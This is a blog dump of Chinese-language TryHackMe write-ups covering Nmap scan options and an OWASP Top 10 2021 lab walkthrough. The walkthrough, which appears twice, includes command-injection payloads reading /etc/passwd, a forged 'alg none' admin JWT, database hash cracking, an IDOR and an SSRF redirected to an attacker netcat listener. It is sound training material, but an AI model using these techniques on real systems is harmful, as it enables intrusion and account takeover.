alt=\"title\"></p>\n<p>提到Nmap使用多种方式来指定其目标：</p>\n<ul>\n<li><p>IP 范围使用-：如果要扫描从 192.168.0.1 到 192.168.0.10 的所有 IP 地址，就写成192.168.0.1-10</p>\n</li>\n<li><p>IP 子网使用&#x2F;：如果要扫描子网，可以将其表示为192.168.0.1&#x2F;24，这相当于192.168.0.0-255</p>\n</li>\n<li><p>主机名：您还可以通过主机名指定目标，例如，example.thm</p>\n</li>\n</ul>\n<p>更好地控制Nmap如何通过给定端口发现实时主机（例如-PS[portlist]、-PA[portlist]），-PU[portlist]以进行TCP SYN、TCP ACK 和UDP发现。</p>\n<ul>\n<li><p>-sL 此扫描仅列出要扫描的目标，而不会实际扫描它们</p>\n</li>\n<li><p>-sn 目的是发现活动主机而不尝试发现其上运行的服务。</p>\n</li>\n<li><p>-sT 连接扫描  (扫描需要完成tcp三次握手)</p>\n</li>\n<li><p>-sS SYN扫描(仅完成第一步)</p>\n</li>\n<li><p>-sU UDP扫描 (UDP扫描)</p>\n</li>\n<li><p>-F 代表快速模式，扫描 100 个最常见的端口</p>\n</li>\n<li><p>-p[range] 允许您指定要扫描的端口范围。例如，-p10-1024扫描从端口 10 到端口 1024，</p>\n</li>\n<li><p>-p-25 扫描 1 到 25 之间的所有端口。</p>\n</li>\n<li><p>-p- 扫描所有端口和相当于-p1-65535</p>\n</li>\n<li><p>-O 启用操作系统检测。</p>\n</li>\n<li><p>-sV 启用版本检测。这非常方便您用更少的按键收集有关目标的更多信息。发现了几个开放端口，并想知道哪些服务正在监听它们</p>\n</li>\n<li><p>-A 有-O，-sV并且还有更多功能，此选项可实现操作系统检测、版本扫描和跟踪路由等功能。</p>\n</li>\n<li><p>-Pn 能将所有主机视为在线并对每个主机进行端口扫描，包括在主机发现阶段未响应的主机。</p>\n</li>\n<li><p>-T 可以按名称或编号选择计时模板。举例: -T0(或-T 0) 或-T paranoid(paranoid就是计时模板的名称)以选择最慢的计时。</p>\n</li>\n</ul>\n<p>并行探测的数量可以通过–min-parallelism <numprobes>和 来控制–max-parallelism <numprobes>。这些选项可用于设置主机组中同时活动的 TCP 和 UDP 端口探测数量的最小值和最大值。</numprobes></numprobes></p>\n<p>类似有用的选项是–min-rate <number>和–max-rate <number>。顾名思义，它们可以控制nmap发送数据包的最小和最大速率。</number></number></p>\n<ul>\n<li><p>–host-timeout <time>。此选项指定您愿意等待的最大时间，适用于速度较慢的主机或网络连接较慢的主机。</time></p>\n</li>\n<li><p>-v 启用详细输出</p>\n</li>\n<li><p>-d 使用调试级别输出 最高级别是-d9 您可以通过添加一个或多个“d”或直接指定调试级别来提高调试级别</p>\n</li>\n<li><p>oN <filename>- 正常输出</filename></p>\n</li>\n<li><p>oX <filename>- XML输出</filename></p>\n</li>\n<li><p>oG <filename>- -able 输出 (对和grep有用)grepawk</filename></p>\n</li>\n<li><p>oA <basename>- 以所有主要格式输出</basename></p>\n</li>\n</ul>\n<p>随便看看thm的问题</p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task2.png\" alt=\"task1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sL ip/27</span><br></pre></td></tr></table></figure>\n<p>用-sL列出所有要扫描的目标 找到最后一个就行<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/sl%20ip.png\" alt=\"task\"></p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task3.png\" alt=\"task1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sT ip</span><br></pre></td></tr></table></figure>\n<p>就能列出所有tcp端口 在这些端口中能发现一个http的端口8008 ip加端口就能获得第二问的flag</p>\n<p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/tcpport%E7%AB%AF%E5%8F%A3.png\" alt=\"task2\"></p>\n<p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/8008.png\" alt=\"task2\"></p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task4.png\" alt=\"task1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -A ip</span><br></pre></td></tr></table></figure>\n<p>用了-A把服务器名称 版本等详细信息都查出来了 慢慢找就行<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/web.png\" alt=\"task4\"></p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>下面就是直接输入就行的 -T的用法</p>\n<p><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task5.png\" alt=\"task1\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>启用调试是-d<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task6.png\" alt=\"task1\"></p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>在没有root权限 是本地用户的时候只能使用-sT的tcp连接扫描(connect scan)<br><img src=\"/images/tryhackme-nmap%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/task7.png\" alt=\"task1\"></p>\n<p>解决了nmap的基础问题</p>\n"},{"title":"tryhackme OWASP Top 10 - 2021上集","date":"2025-02-07T03:02:13.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/08/KSlheFtJzA7xCf2.jpg","_content":"tryhackme的OWASP Top 10 的题目和记录\n\nOWASP Top 10 \n\n访问控制失效\n加密失败\n注入\n不安全的设计\n安全配置错误\n易受攻击和过时的组件\n识别和认证失败\n软件和数据完整性故障\n安全日志和监控失败\n服务端请求伪造（SSRF）\n\n## 1.访问控制失效\n\n攻击者可能通过绕过访问控制机制，获取未授权的资源或执行未授权的操作。\n\nIDOR 或不安全的直接对象引用是指一种访问控制漏洞，利用该漏洞您可以访问通常无法看到的资源。当程序员公开直接对象引用时就会发生这种情况，它只是指向服务器内特定对象的标识符。我们所说的对象可能是指文件、用户、银行应用程序中的银行账户或任何其他对象。\n\n![task1](/images/tryhackme-OWASP-Top-10-2021/task1.png)\n\n我们进入题目要求的网站 用给的账户登录一下 、\n\n\n登进去后会就是显示普通的文本 但观察网址会发现后面有个note_id=1这个字样 从零开始输 看看有没有可能出flag\n第一个就出flag了\n\n![task1](/images/tryhackme-OWASP-Top-10-2021/flag.png)\n\n\n## 2 加密失败\n\n加密故障是指因误用（或未使用）用于保护敏感信息的加密算法而产生的任何漏洞。Web 应用程序需要加密技术来为其用户提供多层次的机密性。\n\n加密失败的第二部分 我们简单学习了一下下载数据库和查找数据库的有用信息 还有一个等下用得着的网站[crackstation](https://crackstation.net/)\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/task2.png)\n\n进入网站查看有什么问题吗\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/web.png)\n\n看看网站源码\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb0.png)\n\n发现有很多都是来自assets 在网址后面加个/assets试试看\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb.png)\n\n看到最后一个数据库文件 把他下过来。然后查看一下数据库里有什么重要文件\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb0.5.png)\n\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb1.png)\n\n能找到admin的密码的hash值 拉到上面说的网站里面解密能知道明文密码\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb3.png)\n\n在网站中登录admin账户就能发现flag\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/login.png)\n\n\n## 3 注入\n包括sql注入 命令注入\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/task3.png)\n\n这个thm讲的是命令注入\n\n先输入$(ls)试试水\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/drpepper.png)\n\n\n试试看$(cat /etc/passwd | grep \"usr\")查一下第二题说的用户\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/shell.png)\n\n但发现都是在/sbin中 都属于root用户 所以说是零个用户 用户shell就是/sbin/shell\n\n查应用程序以什么用户身份运行？直接whoami\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/whoami.png)\n\n发现是apache用户\n\n查版本就 cat /etc/os-release\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/os-rease.png)\n\n是3.16.0版本\n\n## 4 不安全的设计\n不安全的设计是指应用程序架构固有的漏洞。这些漏洞不是由于糟糕的实现或配置而导致的，而是整个应用程序（或其中的一部分）背后的理念从一开始就存在缺陷。\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/task4.png)\n\n进入网站 直接开始重置账户 选中间那个最喜欢的颜色\n红黄蓝绿一直输 发现是绿色 重置成功。登录进去就能发现flag\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/green.png)\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/greenflag.png)\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/greenflag1.png)\n\n\n## 5 安全配置错误\n安全配置错误与其他十大漏洞不同，因为它们发生在安全配置本来可以正确配置但实际上却没有配置的情况下。即使您下载了最新的软件，错误的配置也可能使您的安装变得脆弱。\n\n\n先进入网站尝尝~~咸蛋~~咸淡\n![task5](/images/tryhackme-OWASP-Top-10-2021/console.png)\n\n我们直接复制thm给出来的代码 在这里面跑跑\n\n![task5](/images/tryhackme-OWASP-Top-10-2021/tododb.png)\n\n能发现数据库名字是todo.db\n\n根据thm的提示 我们稍微改改他给出来的命令 就能查出flag\n\n```\nimport os; print(os.popen(\"cat app.py | grep 'flag'\").read())\n```\n\n![task5](/images/tryhackme-OWASP-Top-10-2021/py.png)\n\n\n## 6 易受攻击和过时的组件\n版本不及时更新的话容易遇到一下漏洞攻击\n\n进入网站看看 诶呦是个线上书店 直接把cse bookstore去谷歌搜索一下看有什么漏洞吗\n\n挺好 找到一个\n\n![task](/images/tryhackme-OWASP-Top-10-2021/looudong.png)\n\n那他下载过来 直接跑一遍 漏洞利用成功，cat一下/opt/flag.txt 就能就能获得flag\n\n![task](/images/tryhackme-OWASP-Top-10-2021/books.png)\n\n## 7 身份识别和认证失败\n\n身份验证和会话管理是现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户输入这些凭据，然后服务器验证它们。如果它们正确，服务器将向用户的浏览器提供会话 cookie 。需要会话 cookie 是因为 Web 服务器使用HTTP (S) 进行通信，而 HTTP (S) 是无状态的。附加会话 cookie 意味着服务器将知道谁在发送什么数据。然后服务器可以跟踪用户的操作。\n\n身份验证机制中的一些常见缺陷包括：\n\n- 暴力攻击\n- 使用弱凭证\n- 弱会话 Cookie。 \n\n看看题目\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/task7.png)\n\n进入网站看看 说是要先注册一个darren的账户 \n\n你会发现注册darren的话 会说明账户已存在 \n\n在注册账户的时候 在darren的d的前面加一个空格再来照常注册 发现注册成功 \n\n用刚才的账户密码就能登录darren账户找到flag\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/login1.png)\n\narthur也是一样的操作\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/arthur.png)\n\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/arthur1.png)\n\n\n## 软件和数据完整性故障\n\n此漏洞源自使用未使用任何完整性检查的软件或数据的代码或基础架构。由于未进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。此类别中主要有两种类型的漏洞：\n\n- 软件完整性故障\n- 数据完整性故障\n\n### 软件完整性故障\n来看看thm的题目 这里讲的是 jQuery\n如果你愿意，你可以直接从他们的服务器将 jQuery 包含在你的网站中，而无需实际下载它，只需在你网站的 HTML 代码中包含以下行：\n```\n<script src=\"https://code.jquery.com/jquery-3.6.1.min.js\"></script>\n```\n当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。\n\n如果攻击者以某种方式入侵 jQuery 官方存储库，他们可以更改内容``https://code.jquery.com/jquery-3.6.1.min.js`` 以注入恶意代码。\n\n题目\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/task8.0.png)\n\n将https://code.jquery.com/jquery-1.12.4.min.js转成SHA-256的形式\n\n[来这里](https://www.srihash.org/)\n\n```\nhttps://code.jquery.com/jquery-1.12.4.min.js\n```\n\n进入网站就能转化成SHA-256 这个就答案\n\n### 数据完整性故障\n\n通常，当用户登录应用程序时，他们会被分配某种会话令牌，该令牌需要在会话持续期间保存在浏览器中。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 Cookie 分配。Cookie是Web 应用程序将存储在用户浏览器中的键值对，并且将在每次向发出它们的网站发出请求时自动重复。\n\n如果您正在创建一个 Web 邮件应用程序，您可以在登录后为每个用户分配一个包含其用户名的 Cookie。在后续请求中，您的浏览器将始终在 Cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。\n\n因此如果用户篡改 Cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！此应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。\n\n解决此问题的一个方法是使用某种完整性机制来保证 cookie 未被用户更改。为了避免重复工作，我们可以使用一些允许您执行此操作的令牌实现，并处理所有加密以提供完整性证明，而无需您为此操心。JSON Web 令牌 (JWT)就是这样一种实现。\n\n看题目\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/task8.png)\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/task8.1.png)\n\n进入网站 guest随便输入一次 报错就知道密码了\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/cookie.png)\n\n进去之后f12找出jwt\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/cookieflag.png)\n\n把hs256改成none 用户名改成admin\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt.png)\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt1.png)\n\n改好的这两个参数重新转化为base64\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt2.png)\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt3.png)\n\n把这个粘贴在一起 用.间隔。最后面也要用.结尾\n\n把jwt代替之前的jwt 刷新一下就有flag了\n\n![flag](/images/tryhackme-OWASP-Top-10-2021/cookieflag1.png)\n\n\n## 9 安全日志和监控失败\n设置 Web 应用程序时，应记录用户执行的每个操作。记录很重要，因为一旦发生事件，攻击者的活动就会被追踪。一旦追踪到他们的行为，就可以确定他们的风险和影响。如果没有记录，就无法知道攻击者在获得特定 Web 应用程序的访问权限后执行了哪些操作。\n\n\n日志中存储的信息应包括以下内容：\n- HTTP状态代码\n- 时间戳\n- 用户名\n- API端点/页面位置\n- IP 地址\n\n下载日志看看\n\n![task9](/images/tryhackme-OWASP-Top-10-2021/task9.png)\n\n![task9](/images/tryhackme-OWASP-Top-10-2021/log.png)\n\n看到连续几个相同的ip盲猜就是攻击者ip\n\n这样看的话就是暴力破解\n\n## 10 服务器端请求伪造（SSRF）\n\n这种类型的漏洞发生在攻击者可以强迫 Web 应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时。SSRF漏洞通常出现在我们的 Web 应用程序需要使用第三方服务的实现中。\n\n![task10](/images/tryhackme-OWASP-Top-10-2021/task10.png)\n\n依旧进入网站 发现是个类似博客的东西 周围找找看有什么可以做的吗\n\n![task10](/images/tryhackme-OWASP-Top-10-2021/admin.png)\n\n点进去发现 要localhost才能进去\n\n![task](/images/tryhackme-OWASP-Top-10-2021/localhost.png)\n\n第二问 问点击下载按钮。服务器参数指向哪里？\n\n直接f12 找到下载按钮 发现了下载路径\n\n![task](/images/tryhackme-OWASP-Top-10-2021/down.png)\n\n这个路径也有大作用 正常来说我们下载那个pdf使用这个路径\n\n```\nhttp://10.10.234.129:8087/download?server=secure-file-storage.com:8087&id=75482342\n```\n\n我们要把后面的server=的值改成attackbox或者是你虚拟机连openvpn的ip 其他都不动\n\n然后打开终端 设置监听 \n\n```\nnc -lvnp 8087\n```\n\n启动完就把改好的网址在浏览器那搜索一下 终端就能找到flag\n\n![ask](/images/tryhackme-OWASP-Top-10-2021/api1.png)\n\n于是乎 把thm的owasp top-10简单介绍一下了 过段时间继续学习更新owasp top-1o！！！\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/tryhackme-OWASP-Top-10-2021上集.md","raw":"---\ntitle: tryhackme OWASP Top 10 - 2021上集\ndate: 2025-02-07 11:02:13\ntags: oaasp 漏洞 tryhackme \ntop_img: transparent\ncover: https://s2.loli.net/2025/02/08/KSlheFtJzA7xCf2.jpg\n---\ntryhackme的OWASP Top 10 的题目和记录\n\nOWASP Top 10 \n\n访问控制失效\n加密失败\n注入\n不安全的设计\n安全配置错误\n易受攻击和过时的组件\n识别和认证失败\n软件和数据完整性故障\n安全日志和监控失败\n服务端请求伪造（SSRF）\n\n## 1.访问控制失效\n\n攻击者可能通过绕过访问控制机制，获取未授权的资源或执行未授权的操作。\n\nIDOR 或不安全的直接对象引用是指一种访问控制漏洞，利用该漏洞您可以访问通常无法看到的资源。当程序员公开直接对象引用时就会发生这种情况，它只是指向服务器内特定对象的标识符。我们所说的对象可能是指文件、用户、银行应用程序中的银行账户或任何其他对象。\n\n![task1](/images/tryhackme-OWASP-Top-10-2021/task1.png)\n\n我们进入题目要求的网站 用给的账户登录一下 、\n\n\n登进去后会就是显示普通的文本 但观察网址会发现后面有个note_id=1这个字样 从零开始输 看看有没有可能出flag\n第一个就出flag了\n\n![task1](/images/tryhackme-OWASP-Top-10-2021/flag.png)\n\n\n## 2 加密失败\n\n加密故障是指因误用（或未使用）用于保护敏感信息的加密算法而产生的任何漏洞。Web 应用程序需要加密技术来为其用户提供多层次的机密性。\n\n加密失败的第二部分 我们简单学习了一下下载数据库和查找数据库的有用信息 还有一个等下用得着的网站[crackstation](https://crackstation.net/)\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/task2.png)\n\n进入网站查看有什么问题吗\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/web.png)\n\n看看网站源码\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb0.png)\n\n发现有很多都是来自assets 在网址后面加个/assets试试看\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb.png)\n\n看到最后一个数据库文件 把他下过来。然后查看一下数据库里有什么重要文件\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb0.5.png)\n\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb1.png)\n\n能找到admin的密码的hash值 拉到上面说的网站里面解密能知道明文密码\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/webdb3.png)\n\n在网站中登录admin账户就能发现flag\n\n![task2](/images/tryhackme-OWASP-Top-10-2021/login.png)\n\n\n## 3 注入\n包括sql注入 命令注入\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/task3.png)\n\n这个thm讲的是命令注入\n\n先输入$(ls)试试水\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/drpepper.png)\n\n\n试试看$(cat /etc/passwd | grep \"usr\")查一下第二题说的用户\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/shell.png)\n\n但发现都是在/sbin中 都属于root用户 所以说是零个用户 用户shell就是/sbin/shell\n\n查应用程序以什么用户身份运行？直接whoami\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/whoami.png)\n\n发现是apache用户\n\n查版本就 cat /etc/os-release\n\n![task3](/images/tryhackme-OWASP-Top-10-2021/os-rease.png)\n\n是3.16.0版本\n\n## 4 不安全的设计\n不安全的设计是指应用程序架构固有的漏洞。这些漏洞不是由于糟糕的实现或配置而导致的，而是整个应用程序（或其中的一部分）背后的理念从一开始就存在缺陷。\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/task4.png)\n\n进入网站 直接开始重置账户 选中间那个最喜欢的颜色\n红黄蓝绿一直输 发现是绿色 重置成功。登录进去就能发现flag\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/green.png)\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/greenflag.png)\n\n![task4](/images/tryhackme-OWASP-Top-10-2021/greenflag1.png)\n\n\n## 5 安全配置错误\n安全配置错误与其他十大漏洞不同，因为它们发生在安全配置本来可以正确配置但实际上却没有配置的情况下。即使您下载了最新的软件，错误的配置也可能使您的安装变得脆弱。\n\n\n先进入网站尝尝~~咸蛋~~咸淡\n![task5](/images/tryhackme-OWASP-Top-10-2021/console.png)\n\n我们直接复制thm给出来的代码 在这里面跑跑\n\n![task5](/images/tryhackme-OWASP-Top-10-2021/tododb.png)\n\n能发现数据库名字是todo.db\n\n根据thm的提示 我们稍微改改他给出来的命令 就能查出flag\n\n```\nimport os; print(os.popen(\"cat app.py | grep 'flag'\").read())\n```\n\n![task5](/images/tryhackme-OWASP-Top-10-2021/py.png)\n\n\n## 6 易受攻击和过时的组件\n版本不及时更新的话容易遇到一下漏洞攻击\n\n进入网站看看 诶呦是个线上书店 直接把cse bookstore去谷歌搜索一下看有什么漏洞吗\n\n挺好 找到一个\n\n![task](/images/tryhackme-OWASP-Top-10-2021/looudong.png)\n\n那他下载过来 直接跑一遍 漏洞利用成功，cat一下/opt/flag.txt 就能就能获得flag\n\n![task](/images/tryhackme-OWASP-Top-10-2021/books.png)\n\n## 7 身份识别和认证失败\n\n身份验证和会话管理是现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户输入这些凭据，然后服务器验证它们。如果它们正确，服务器将向用户的浏览器提供会话 cookie 。需要会话 cookie 是因为 Web 服务器使用HTTP (S) 进行通信，而 HTTP (S) 是无状态的。附加会话 cookie 意味着服务器将知道谁在发送什么数据。然后服务器可以跟踪用户的操作。\n\n身份验证机制中的一些常见缺陷包括：\n\n- 暴力攻击\n- 使用弱凭证\n- 弱会话 Cookie。 \n\n看看题目\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/task7.png)\n\n进入网站看看 说是要先注册一个darren的账户 \n\n你会发现注册darren的话 会说明账户已存在 \n\n在注册账户的时候 在darren的d的前面加一个空格再来照常注册 发现注册成功 \n\n用刚才的账户密码就能登录darren账户找到flag\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/login1.png)\n\narthur也是一样的操作\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/arthur.png)\n\n\n![task7](/images/tryhackme-OWASP-Top-10-2021/arthur1.png)\n\n\n## 软件和数据完整性故障\n\n此漏洞源自使用未使用任何完整性检查的软件或数据的代码或基础架构。由于未进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。此类别中主要有两种类型的漏洞：\n\n- 软件完整性故障\n- 数据完整性故障\n\n### 软件完整性故障\n来看看thm的题目 这里讲的是 jQuery\n如果你愿意，你可以直接从他们的服务器将 jQuery 包含在你的网站中，而无需实际下载它，只需在你网站的 HTML 代码中包含以下行：\n```\n<script src=\"https://code.jquery.com/jquery-3.6.1.min.js\"></script>\n```\n当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。\n\n如果攻击者以某种方式入侵 jQuery 官方存储库，他们可以更改内容``https://code.jquery.com/jquery-3.6.1.min.js`` 以注入恶意代码。\n\n题目\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/task8.0.png)\n\n将https://code.jquery.com/jquery-1.12.4.min.js转成SHA-256的形式\n\n[来这里](https://www.srihash.org/)\n\n```\nhttps://code.jquery.com/jquery-1.12.4.min.js\n```\n\n进入网站就能转化成SHA-256 这个就答案\n\n### 数据完整性故障\n\n通常，当用户登录应用程序时，他们会被分配某种会话令牌，该令牌需要在会话持续期间保存在浏览器中。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 Cookie 分配。Cookie是Web 应用程序将存储在用户浏览器中的键值对，并且将在每次向发出它们的网站发出请求时自动重复。\n\n如果您正在创建一个 Web 邮件应用程序，您可以在登录后为每个用户分配一个包含其用户名的 Cookie。在后续请求中，您的浏览器将始终在 Cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。\n\n因此如果用户篡改 Cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！此应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。\n\n解决此问题的一个方法是使用某种完整性机制来保证 cookie 未被用户更改。为了避免重复工作，我们可以使用一些允许您执行此操作的令牌实现，并处理所有加密以提供完整性证明，而无需您为此操心。JSON Web 令牌 (JWT)就是这样一种实现。\n\n看题目\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/task8.png)\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/task8.1.png)\n\n进入网站 guest随便输入一次 报错就知道密码了\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/cookie.png)\n\n进去之后f12找出jwt\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/cookieflag.png)\n\n把hs256改成none 用户名改成admin\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt.png)\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt1.png)\n\n改好的这两个参数重新转化为base64\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt2.png)\n\n![task8](/images/tryhackme-OWASP-Top-10-2021/jwt3.png)\n\n把这个粘贴在一起 用.间隔。最后面也要用.结尾\n\n把jwt代替之前的jwt 刷新一下就有flag了\n\n![flag](/images/tryhackme-OWASP-Top-10-2021/cookieflag1.png)\n\n\n## 9 安全日志和监控失败\n设置 Web 应用程序时，应记录用户执行的每个操作。记录很重要，因为一旦发生事件，攻击者的活动就会被追踪。一旦追踪到他们的行为，就可以确定他们的风险和影响。如果没有记录，就无法知道攻击者在获得特定 Web 应用程序的访问权限后执行了哪些操作。\n\n\n日志中存储的信息应包括以下内容：\n- HTTP状态代码\n- 时间戳\n- 用户名\n- API端点/页面位置\n- IP 地址\n\n下载日志看看\n\n![task9](/images/tryhackme-OWASP-Top-10-2021/task9.png)\n\n![task9](/images/tryhackme-OWASP-Top-10-2021/log.png)\n\n看到连续几个相同的ip盲猜就是攻击者ip\n\n这样看的话就是暴力破解\n\n## 10 服务器端请求伪造（SSRF）\n\n这种类型的漏洞发生在攻击者可以强迫 Web 应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时。SSRF漏洞通常出现在我们的 Web 应用程序需要使用第三方服务的实现中。\n\n![task10](/images/tryhackme-OWASP-Top-10-2021/task10.png)\n\n依旧进入网站 发现是个类似博客的东西 周围找找看有什么可以做的吗\n\n![task10](/images/tryhackme-OWASP-Top-10-2021/admin.png)\n\n点进去发现 要localhost才能进去\n\n![task](/images/tryhackme-OWASP-Top-10-2021/localhost.png)\n\n第二问 问点击下载按钮。服务器参数指向哪里？\n\n直接f12 找到下载按钮 发现了下载路径\n\n![task](/images/tryhackme-OWASP-Top-10-2021/down.png)\n\n这个路径也有大作用 正常来说我们下载那个pdf使用这个路径\n\n```\nhttp://10.10.234.129:8087/download?server=secure-file-storage.com:8087&id=75482342\n```\n\n我们要把后面的server=的值改成attackbox或者是你虚拟机连openvpn的ip 其他都不动\n\n然后打开终端 设置监听 \n\n```\nnc -lvnp 8087\n```\n\n启动完就把改好的网址在浏览器那搜索一下 终端就能找到flag\n\n![ask](/images/tryhackme-OWASP-Top-10-2021/api1.png)\n\n于是乎 把thm的owasp top-10简单介绍一下了 过段时间继续学习更新owasp 